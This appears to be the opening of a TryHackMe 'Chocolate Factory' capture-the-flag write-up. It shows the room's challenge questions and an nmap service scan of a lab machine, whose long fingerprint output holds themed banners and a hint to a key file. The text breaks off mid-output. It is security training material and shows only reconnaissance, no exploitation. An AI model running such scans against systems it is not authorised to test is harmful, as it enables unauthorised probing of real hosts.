---
title: "Challenges: Chocolate Factory (TryHackMe)"
datePublished: Fri Aug 15 2025 21:00:00 GMT+0000 (Coordinated Universal Time)
cuid: cmeu1b0ki000302jx2rfy1mfq
slug: challenges-chocolate-factory-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1755076945130/ac0f89c3-ffad-4d37-8bdb-8ad1c6cc1cb0.png
tags: python, tryhackme, teleport, ctf-writeup, privilege-escalation

---

Welcome to **Willy Wonka’s Chocolate Factory** 🎩🍫

This beginner-friendly CTF takes you on a journey through the whimsical world of Willy Wonka, where each challenge uncovers secrets hidden behind the factory’s walls. Along the way, you’ll meet the Oompa Loompas, solve puzzles, and hunt for flags that unlock the story.

The goal? Use your reconnaissance and exploitation skills to uncover passwords, find hidden keys, and prove you’re worthy of inheriting Willy Wonka’s magical factory.

## Introduction

**Welcome to Willy Wonka's Chocolate Factory!**

![](https://i.pinimg.com/originals/01/86/9e/01869e0b2238d8307020d2c4503cec51.jpg align="center")

This room was designed so that hackers can revisit the Willy Wonka's Chocolate Factory and meet Oompa Loompa

This is a beginner friendly room!

## Challenges

### Answer the questions below

Enter the key you found!

What is Charlie's password?

`nmap -sV IP_Address`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756279979128/2fe7f881-6880-4879-a1d7-4653069b7ae4.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756279978947/44b09335-0a17-43d0-aa3f-573d5117ad73.png align="center")

```bash
nmap -sV 10.10.173.213
Starting Nmap 7.80 ( <https://nmap.org> ) at 2025-08-12 08:51 BST
Nmap scan report for ip-10-10-173-213.eu-west-1.compute.internal (10.10.173.213)
Host is up (0.00020s latency).
Not shown: 989 closed ports
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 3.0.5
22/tcp  open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http       Apache httpd 2.4.41 ((Ubuntu))
100/tcp open  newacct?
106/tcp open  pop3pw?
109/tcp open  pop2?
110/tcp open  pop3?
111/tcp open  rpcbind?
113/tcp open  ident?
119/tcp open  nntp?
125/tcp open  locus-map?
8 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at <https://nmap.org/cgi-bin/submit.cgi?new-service> :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port100-TCP:V=7.80%I=7%D=8/12%Time=689AF283%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\\"Welcome\\x20to\\x20chocolate\\x20room!!\\x20\\r\\n\\x20\\x20\\x20\\x20__
SF:_\\x20\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\.---------------\\.\\r\\n\\x2
SF:0\\x20\\.'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__,`\\x20\\x20\\x20\\.\\x20\\x20____\\x2
SF:0___\\x20\\\\\\r\\n\\x20\\x20\\\\\\|\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20_:
SF:\\\\\\x20\\x20\\|:\\.\\x20\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\n\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\
SF:'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\_`\\.__\\|\\x20\\x20`\\.\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\
SF:n\\x20\\x20\\x20\\x20\\\\\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__:\\x20\\x
SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\r\\n\\x20\\x2
SF:0\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\\\x20\\\\__\\\\'\\\\_;-----------------`
SF:\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20
SF:\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20
SF:\\x20\\x20\\x20\\x20\\x20\\x20\\|\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\|_________
SF:_____________;________________\\|\\r\\n\\r\\nA\\x20small\\x20hint\\x20from\\x20M
SF:r\\.Wonka\\x20:\\x20Look\\x20somewhere\\x20else,\\x20its\\x20not\\x20here!\\x20;
SF:\\)\\x20\\r\\nI\\x20hope\\x20you\\x20wont\\x20drown\\x20Augustus\\"\\x20")%r(Gener
SF:icLines,20F,"\\"Welcome\\x20to\\x20chocolate\\x20room!!\\x20\\r\\n\\x20\\x20\\x20
SF:\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\.---------------\\.\\
SF:r\\n\\x20\\x20\\.'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__,`\\x20\\x20\\x20\\.\\x20\\x20_
SF:___\\x20___\\x20\\\\\\r\\n\\x20\\x20\\\\\\|\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/
SF:\\x20_:\\\\\\x20\\x20\\|:\\.\\x20\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\n\\x20\\x20\\x20\\\\\\\\'
SF:\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\_`\\.__\\|\\x20\\x20`\\.\\x20\\\\\\x20\\x20\\\\___\\x2
SF:0\\\\\\r\\n\\x20\\x20\\x20\\x20\\\\\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__:
SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\r\\n\\
SF:x20\\x20\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\\\x20\\\\__\\\\'\\\\_;------------
SF:-----`\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x
SF:20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x
SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\|___
SF:___________________;________________\\|\\r\\n\\r\\nA\\x20small\\x20hint\\x20fro
SF:m\\x20Mr\\.Wonka\\x20:\\x20Look\\x20somewhere\\x20else,\\x20its\\x20not\\x20here
SF:!\\x20;\\)\\x20\\r\\nI\\x20hope\\x20you\\x20wont\\x20drown\\x20Augustus\\"\\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port106-TCP:V=7.80%I=7%D=8/12%Time=689AF283%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\\"Welcome\\x20to\\x20chocolate\\x20room!!\\x20\\r\\n\\x20\\x20\\x20\\x20__
SF:_\\x20\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\.---------------\\.\\r\\n\\x2
SF:0\\x20\\.'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__,`\\x20\\x20\\x20\\.\\x20\\x20____\\x2
SF:0___\\x20\\\\\\r\\n\\x20\\x20\\\\\\|\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20_:
SF:\\\\\\x20\\x20\\|:\\.\\x20\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\n\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\
SF:'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\_`\\.__\\|\\x20\\x20`\\.\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\
SF:n\\x20\\x20\\x20\\x20\\\\\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__:\\x20\\x
SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\r\\n\\x20\\x2
SF:0\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\\\x20\\\\__\\\\'\\\\_;-----------------`
SF:\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20
SF:\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20
SF:\\x20\\x20\\x20\\x20\\x20\\x20\\|\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\|_________
SF:_____________;________________\\|\\r\\n\\r\\nA\\x20small\\x20hint\\x20from\\x20M
SF:r\\.Wonka\\x20:\\x20Look\\x20somewhere\\x20else,\\x20its\\x20not\\x20here!\\x20;
SF:\\)\\x20\\r\\nI\\x20hope\\x20you\\x20wont\\x20drown\\x20Augustus\\"\\x20")%r(Gener
SF:icLines,20F,"\\"Welcome\\x20to\\x20chocolate\\x20room!!\\x20\\r\\n\\x20\\x20\\x20
SF:\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\.---------------\\.\\
SF:r\\n\\x20\\x20\\.'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__,`\\x20\\x20\\x20\\.\\x20\\x20_
SF:___\\x20___\\x20\\\\\\r\\n\\x20\\x20\\\\\\|\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/
SF:\\x20_:\\\\\\x20\\x20\\|:\\.\\x20\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\n\\x20\\x20\\x20\\\\\\\\'
SF:\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\_`\\.__\\|\\x20\\x20`\\.\\x20\\\\\\x20\\x20\\\\___\\x2
SF:0\\\\\\r\\n\\x20\\x20\\x20\\x20\\\\\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__:
SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\r\\n\\
SF:x20\\x20\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\\\x20\\\\__\\\\'\\\\_;------------
SF:-----`\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x
SF:20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x
SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\|___
SF:___________________;________________\\|\\r\\n\\r\\nA\\x20small\\x20hint\\x20fro
SF:m\\x20Mr\\.Wonka\\x20:\\x20Look\\x20somewhere\\x20else,\\x20its\\x20not\\x20here
SF:!\\x20;\\)\\x20\\r\\nI\\x20hope\\x20you\\x20wont\\x20drown\\x20Augustus\\"\\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port109-TCP:V=7.80%I=7%D=8/12%Time=689AF283%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\\"Welcome\\x20to\\x20chocolate\\x20room!!\\x20\\r\\n\\x20\\x20\\x20\\x20__
SF:_\\x20\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\.---------------\\.\\r\\n\\x2
SF:0\\x20\\.'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__,`\\x20\\x20\\x20\\.\\x20\\x20____\\x2
SF:0___\\x20\\\\\\r\\n\\x20\\x20\\\\\\|\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20_:
SF:\\\\\\x20\\x20\\|:\\.\\x20\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\n\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\
SF:'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\_`\\.__\\|\\x20\\x20`\\.\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\
SF:n\\x20\\x20\\x20\\x20\\\\\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__:\\x20\\x
SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\r\\n\\x20\\x2
SF:0\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\\\x20\\\\__\\\\'\\\\_;-----------------`
SF:\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20
SF:\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20
SF:\\x20\\x20\\x20\\x20\\x20\\x20\\|\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\|_________
SF:_____________;________________\\|\\r\\n\\r\\nA\\x20small\\x20hint\\x20from\\x20M
SF:r\\.Wonka\\x20:\\x20Look\\x20somewhere\\x20else,\\x20its\\x20not\\x20here!\\x20;
SF:\\)\\x20\\r\\nI\\x20hope\\x20you\\x20wont\\x20drown\\x20Augustus\\"\\x20")%r(Gener
SF:icLines,20F,"\\"Welcome\\x20to\\x20chocolate\\x20room!!\\x20\\r\\n\\x20\\x20\\x20
SF:\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\.---------------\\.\\
SF:r\\n\\x20\\x20\\.'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__,`\\x20\\x20\\x20\\.\\x20\\x20_
SF:___\\x20___\\x20\\\\\\r\\n\\x20\\x20\\\\\\|\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/
SF:\\x20_:\\\\\\x20\\x20\\|:\\.\\x20\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\n\\x20\\x20\\x20\\\\\\\\'
SF:\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\_`\\.__\\|\\x20\\x20`\\.\\x20\\\\\\x20\\x20\\\\___\\x2
SF:0\\\\\\r\\n\\x20\\x20\\x20\\x20\\\\\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__:
SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\r\\n\\
SF:x20\\x20\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\\\x20\\\\__\\\\'\\\\_;------------
SF:-----`\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x
SF:20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x
SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\|___
SF:___________________;________________\\|\\r\\n\\r\\nA\\x20small\\x20hint\\x20fro
SF:m\\x20Mr\\.Wonka\\x20:\\x20Look\\x20somewhere\\x20else,\\x20its\\x20not\\x20here
SF:!\\x20;\\)\\x20\\r\\nI\\x20hope\\x20you\\x20wont\\x20drown\\x20Augustus\\"\\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port110-TCP:V=7.80%I=7%D=8/12%Time=689AF283%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\\"Welcome\\x20to\\x20chocolate\\x20room!!\\x20\\r\\n\\x20\\x20\\x20\\x20__
SF:_\\x20\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\.---------------\\.\\r\\n\\x2
SF:0\\x20\\.'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__,`\\x20\\x20\\x20\\.\\x20\\x20____\\x2
SF:0___\\x20\\\\\\r\\n\\x20\\x20\\\\\\|\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20_:
SF:\\\\\\x20\\x20\\|:\\.\\x20\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\n\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\
SF:'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\_`\\.__\\|\\x20\\x20`\\.\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\
SF:n\\x20\\x20\\x20\\x20\\\\\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__:\\x20\\x
SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\r\\n\\x20\\x2
SF:0\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\\\x20\\\\__\\\\'\\\\_;-----------------`
SF:\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20
SF:\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20
SF:\\x20\\x20\\x20\\x20\\x20\\x20\\|\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\|_________
SF:_____________;________________\\|\\r\\n\\r\\nA\\x20small\\x20hint\\x20from\\x20M
SF:r\\.Wonka\\x20:\\x20Look\\x20somewhere\\x20else,\\x20its\\x20not\\x20here!\\x20;
SF:\\)\\x20\\r\\nI\\x20hope\\x20you\\x20wont\\x20drown\\x20Augustus\\"\\x20")%r(Gener
SF:icLines,20F,"\\"Welcome\\x20to\\x20chocolate\\x20room!!\\x20\\r\\n\\x20\\x20\\x20
SF:\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\.---------------\\.\\
SF:r\\n\\x20\\x20\\.'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__,`\\x20\\x20\\x20\\.\\x20\\x20_
SF:___\\x20___\\x20\\\\\\r\\n\\x20\\x20\\\\\\|\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/
SF:\\x20_:\\\\\\x20\\x20\\|:\\.\\x20\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\n\\x20\\x20\\x20\\\\\\\\'
SF:\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\_`\\.__\\|\\x20\\x20`\\.\\x20\\\\\\x20\\x20\\\\___\\x2
SF:0\\\\\\r\\n\\x20\\x20\\x20\\x20\\\\\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__:
SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\r\\n\\
SF:x20\\x20\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\\\x20\\\\__\\\\'\\\\_;------------
SF:-----`\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x
SF:20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x
SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\|___
SF:___________________;________________\\|\\r\\n\\r\\nA\\x20small\\x20hint\\x20fro
SF:m\\x20Mr\\.Wonka\\x20:\\x20Look\\x20somewhere\\x20else,\\x20its\\x20not\\x20here
SF:!\\x20;\\)\\x20\\r\\nI\\x20hope\\x20you\\x20wont\\x20drown\\x20Augustus\\"\\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port111-TCP:V=7.80%I=7%D=8/12%Time=689AF283%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\\"Welcome\\x20to\\x20chocolate\\x20room!!\\x20\\r\\n\\x20\\x20\\x20\\x20__
SF:_\\x20\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\.---------------\\.\\r\\n\\x2
SF:0\\x20\\.'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__,`\\x20\\x20\\x20\\.\\x20\\x20____\\x2
SF:0___\\x20\\\\\\r\\n\\x20\\x20\\\\\\|\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20_:
SF:\\\\\\x20\\x20\\|:\\.\\x20\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\n\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\
SF:'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\_`\\.__\\|\\x20\\x20`\\.\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\
SF:n\\x20\\x20\\x20\\x20\\\\\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__:\\x20\\x
SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\r\\n\\x20\\x2
SF:0\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\\\x20\\\\__\\\\'\\\\_;-----------------`
SF:\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20
SF:\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20
SF:\\x20\\x20\\x20\\x20\\x20\\x20\\|\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\|_________
SF:_____________;________________\\|\\r\\n\\r\\nA\\x20small\\x20hint\\x20from\\x20M
SF:r\\.Wonka\\x20:\\x20Look\\x20somewhere\\x20else,\\x20its\\x20not\\x20here!\\x20;
SF:\\)\\x20\\r\\nI\\x20hope\\x20you\\x20wont\\x20drown\\x20Augustus\\"\\x20")%r(RPCCh
SF:eck,20F,"\\"Welcome\\x20to\\x20chocolate\\x20room!!\\x20\\r\\n\\x20\\x20\\x20\\x20
SF:___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\.---------------\\.\\r\\n\\
SF:x20\\x20\\.'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__,`\\x20\\x20\\x20\\.\\x20\\x20____\\
SF:x20___\\x20\\\\\\r\\n\\x20\\x20\\\\\\|\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20
SF:_:\\\\\\x20\\x20\\|:\\.\\x20\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\n\\x20\\x20\\x20\\\\\\\\'\\\\__
SF:\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\_`\\.__\\|\\x20\\x20`\\.\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\
SF:r\\n\\x20\\x20\\x20\\x20\\\\\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__:\\x20
SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\r\\n\\x20\\
SF:x20\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\\\x20\\\\__\\\\'\\\\_;----------------
SF:-`\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20\\x
SF:20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x
SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\|\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\|_______
SF:_______________;________________\\|\\r\\n\\r\\nA\\x20small\\x20hint\\x20from\\x2
SF:0Mr\\.Wonka\\x20:\\x20Look\\x20somewhere\\x20else,\\x20its\\x20not\\x20here!\\x2
SF:0;\\)\\x20\\r\\nI\\x20hope\\x20you\\x20wont\\x20drown\\x20Augustus\\"\\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port113-TCP:V=7.80%I=7%D=8/12%Time=689AF283%P=x86_64-pc-linux-gnu%r(NUL
SF:L,3E,"<http://localhost/key_rev_key\\x20><-\\x20You\\x20will\\x20find\\x20the\\
SF:x20key\\x20here!!!\\n")%r(GenericLines,3E,"<http://localhost/key_rev_key\\x>
SF:20<-\\x20You\\x20will\\x20find\\x20the\\x20key\\x20here!!!\\n")%r(Help,3E,"htt
SF:p://localhost/key_rev_key\\x20<-\\x20You\\x20will\\x20find\\x20the\\x20key\\x2
SF:0here!!!\\n")%r(SMBProgNeg,3E,"<http://localhost/key_rev_key\\x20><-\\x20You
SF:\\x20will\\x20find\\x20the\\x20key\\x20here!!!\\n")%r(NotesRPC,3E,"<http://loc>
SF:alhost/key_rev_key\\x20<-\\x20You\\x20will\\x20find\\x20the\\x20key\\x20here!!
SF:!\\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port119-TCP:V=7.80%I=7%D=8/12%Time=689AF283%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\\"Welcome\\x20to\\x20chocolate\\x20room!!\\x20\\r\\n\\x20\\x20\\x20\\x20__
SF:_\\x20\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\.---------------\\.\\r\\n\\x2
SF:0\\x20\\.'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__,`\\x20\\x20\\x20\\.\\x20\\x20____\\x2
SF:0___\\x20\\\\\\r\\n\\x20\\x20\\\\\\|\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20_:
SF:\\\\\\x20\\x20\\|:\\.\\x20\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\n\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\
SF:'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\_`\\.__\\|\\x20\\x20`\\.\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\
SF:n\\x20\\x20\\x20\\x20\\\\\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__:\\x20\\x
SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\r\\n\\x20\\x2
SF:0\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\\\x20\\\\__\\\\'\\\\_;-----------------`
SF:\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20
SF:\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20
SF:\\x20\\x20\\x20\\x20\\x20\\x20\\|\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\|_________
SF:_____________;________________\\|\\r\\n\\r\\nA\\x20small\\x20hint\\x20from\\x20M
SF:r\\.Wonka\\x20:\\x20Look\\x20somewhere\\x20else,\\x20its\\x20not\\x20here!\\x20;
SF:\\)\\x20\\r\\nI\\x20hope\\x20you\\x20wont\\x20drown\\x20Augustus\\"\\x20")%r(Gener
SF:icLines,20F,"\\"Welcome\\x20to\\x20chocolate\\x20room!!\\x20\\r\\n\\x20\\x20\\x20
SF:\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\.---------------\\.\\
SF:r\\n\\x20\\x20\\.'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__,`\\x20\\x20\\x20\\.\\x20\\x20_
SF:___\\x20___\\x20\\\\\\r\\n\\x20\\x20\\\\\\|\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/
